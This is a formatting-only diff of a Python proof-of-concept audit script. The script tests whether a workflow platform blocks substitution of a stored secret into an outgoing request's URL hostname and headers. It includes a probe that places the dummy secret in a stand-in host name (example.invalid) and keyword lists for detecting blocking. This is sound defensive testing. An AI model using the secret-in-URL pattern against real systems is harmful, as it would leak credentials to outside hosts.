@@ -8,6 +8,7 @@ Usage:
     python poc_secret_sub.py --expected=blocked     # default: assert secret-in-URL blocked
     python poc_secret_sub.py --expected=vulnerable  # assert secret substitution works
 """
+
 import argparse
 import json
 import os
@@ -62,13 +63,20 @@ def main():
 
     # Step 1: create an environment with a known secret
     print("[*] Creating environment with secret 'auditSecret' = 'AUDIT-SECRET-XYZ-9999'")
-    code, env = req(BASE, "POST", "/api/environments", {
-        "name": "audit-env",
-        "description": "Security audit environment",
-        "variables": {"baseUrl": BASE},
-        "secrets": {"auditSecret": "AUDIT-SECRET-XYZ-9999"},
-    })
-    print(f"[+] environment: HTTP {code} id={env.get('environmentId') if isinstance(env, dict) else env}")
+    code, env = req(
+        BASE,
+        "POST",
+        "/api/environments",
+        {
+            "name": "audit-env",
+            "description": "Security audit environment",
+            "variables": {"baseUrl": BASE},
+            "secrets": {"auditSecret": "AUDIT-SECRET-XYZ-9999"},
+        },
+    )
+    print(
+        f"[+] environment: HTTP {code} id={env.get('environmentId') if isinstance(env, dict) else env}"
+    )
     if code not in (200, 201):
         print(json.dumps(env, indent=2))
         sys.exit(2)
@@ -80,21 +88,38 @@ def main():
         "name": "Secret Sub PoC",
         "environmentId": env_id,
         "nodes": [
-            {"nodeId": "s", "type": "start", "label": "Start", "position": {"x":0,"y":0}, "config":{}},
-            {"nodeId": "h", "type": "http-request", "label": "Probe", "position": {"x":100,"y":0},
-             "config": {
-                 "method": "GET",
-                 "url": "http://{{secrets.auditSecret}}.example.invalid/",
-                 "headers": "X-Audit-Secret: {{secrets.auditSecret}}",
-                 "body": "",
-                 "bodyType": None,
-                 "timeout": 3,
-             }},
-            {"nodeId": "e", "type": "end", "label": "End", "position": {"x":200,"y":0}, "config":{}},
+            {
+                "nodeId": "s",
+                "type": "start",
+                "label": "Start",
+                "position": {"x": 0, "y": 0},
+                "config": {},
+            },
+            {
+                "nodeId": "h",
+                "type": "http-request",
+                "label": "Probe",
+                "position": {"x": 100, "y": 0},
+                "config": {
+                    "method": "GET",
+                    "url": "http://{{secrets.auditSecret}}.example.invalid/",
+                    "headers": "X-Audit-Secret: {{secrets.auditSecret}}",
+                    "body": "",
+                    "bodyType": None,
+                    "timeout": 3,
+                },
+            },
+            {
+                "nodeId": "e",
+                "type": "end",
+                "label": "End",
+                "position": {"x": 200, "y": 0},
+                "config": {},
+            },
         ],
         "edges": [
-            {"edgeId":"e1","source":"s","target":"h"},
-            {"edgeId":"e2","source":"h","target":"e"},
+            {"edgeId": "e1", "source": "s", "target": "h"},
+            {"edgeId": "e2", "source": "h", "target": "e"},
         ],
     }
     code, w = req(BASE, "POST", "/api/workflows", wf)
@@ -120,7 +145,16 @@ def main():
     if os.path.exists(log):
         with open(log, encoding="utf-8") as f:
             log_text = f.read()
-        for keyword in ["AUDIT-SECRET-XYZ-9999", "Substituting", "Processing variable", "secrets.auditSecret", "Resolved secret", "secret in url", "blocked", "forbidden"]:
+        for keyword in [
+            "AUDIT-SECRET-XYZ-9999",
+            "Substituting",
+            "Processing variable",
+            "secrets.auditSecret",
+            "Resolved secret",
+            "secret in url",
+            "blocked",
+            "forbidden",
+        ]:
             if keyword in log_text:
                 start = max(0, log_text.find(keyword) - 150)
                 end = min(len(log_text), log_text.find(keyword) + 400)
@@ -133,7 +167,9 @@ def main():
     code, res = req(BASE, "GET", f"/api/workflows/{wid}/runs/{rid}/nodes/h/result")
     result = res.get("result", {}) if isinstance(res, dict) else res
     result_json = json.dumps(result)
-    print(f"\n[*] Node result status: {result.get('status') if isinstance(result, dict) else 'N/A'}")
+    print(
+        f"\n[*] Node result status: {result.get('status') if isinstance(result, dict) else 'N/A'}"
+    )
     print(json.dumps(result, indent=2)[:2000])
 
     evidence_lines.append(f"Run status: {status.get('status')}\n\n")
@@ -149,16 +185,31 @@ def main():
     result_error = str(result.get("error", "")) if isinstance(result, dict) else ""
 
     # Check for secret-in-URL blocking
-    secret_in_url_blocked = any(kw in result_error.lower() for kw in [
-        "secret in url", "secret in the url", "secrets in url",
-        "secret substitution", "secret.*url", "disallowed",
-        "blocked", "forbidden", "not allowed",
-    ])
+    secret_in_url_blocked = any(
+        kw in result_error.lower()
+        for kw in [
+            "secret in url",
+            "secret in the url",
+            "secrets in url",
+            "secret substitution",
+            "secret.*url",
+            "disallowed",
+            "blocked",
+            "forbidden",
+            "not allowed",
+        ]
+    )
     # Also check log for blocking
-    log_has_block = any(kw in log_text.lower() for kw in [
-        "secret in url", "secret in the url", "secrets in url",
-        "secret substitution.*blocked", "disallowed",
-    ])
+    log_has_block = any(
+        kw in log_text.lower()
+        for kw in [
+            "secret in url",
+            "secret in the url",
+            "secrets in url",
+            "secret substitution.*blocked",
+            "disallowed",
+        ]
+    )
 
     # Check if secret value leaked in result
     secret_leaked = "AUDIT-SECRET-XYZ-9999" in result_json
@@ -174,32 +225,42 @@ def main():
                 detail += f", error={result_error[:120]}"
             results.append(("Secret in URL blocked", True, detail))
         else:
-            results.append((
-                "Secret in URL blocked",
-                False,
-                f"Expected error about secret-in-URL but got status={result_status}, error={result_error[:120]}",
-            ))
+            results.append(
+                (
+                    "Secret in URL blocked",
+                    False,
+                    f"Expected error about secret-in-URL but got status={result_status}, error={result_error[:120]}",
+                )
+            )
 
         # Additional: secret value must NOT appear in result
         if not secret_leaked:
-            results.append(("Secret value not in result", True, "Secret value masked/absent from node result"))
+            results.append(
+                ("Secret value not in result", True, "Secret value masked/absent from node result")
+            )
         else:
-            results.append(("Secret value not in result", False, "SECRET VALUE PRESENT IN NODE RESULT — leak!"))
+            results.append(
+                ("Secret value not in result", False, "SECRET VALUE PRESENT IN NODE RESULT — leak!")
+            )
 
     else:  # vulnerable
         # PASS if: substitution happened (no error about secret-in-URL)
         if not secret_in_url_blocked and not log_has_block:
-            results.append((
-                "Secret substitution works (vulnerable)",
-                True,
-                f"No blocking error — substitution proceeded, status={result_status}",
-            ))
+            results.append(
+                (
+                    "Secret substitution works (vulnerable)",
+                    True,
+                    f"No blocking error — substitution proceeded, status={result_status}",
+                )
+            )
         else:
-            results.append((
-                "Secret substitution works (vulnerable)",
-                False,
-                f"Expected substitution to proceed but got blocking error: {result_error[:120]}",
-            ))
+            results.append(
+                (
+                    "Secret substitution works (vulnerable)",
+                    False,
+                    f"Expected substitution to proceed but got blocking error: {result_error[:120]}",
+                )
+            )
 
     # --- Report ---
     print("\n" + "=" * 60)
@@ -216,7 +277,9 @@ def main():
     # Save evidence
     evidence_path = os.path.join(
         os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
-        ".omo", "evidence", "task-6-poc-secret-sub.txt",
+        ".omo",
+        "evidence",
+        "task-6-poc-secret-sub.txt",
     )
     try:
         os.makedirs(os.path.dirname(evidence_path), exist_ok=True)
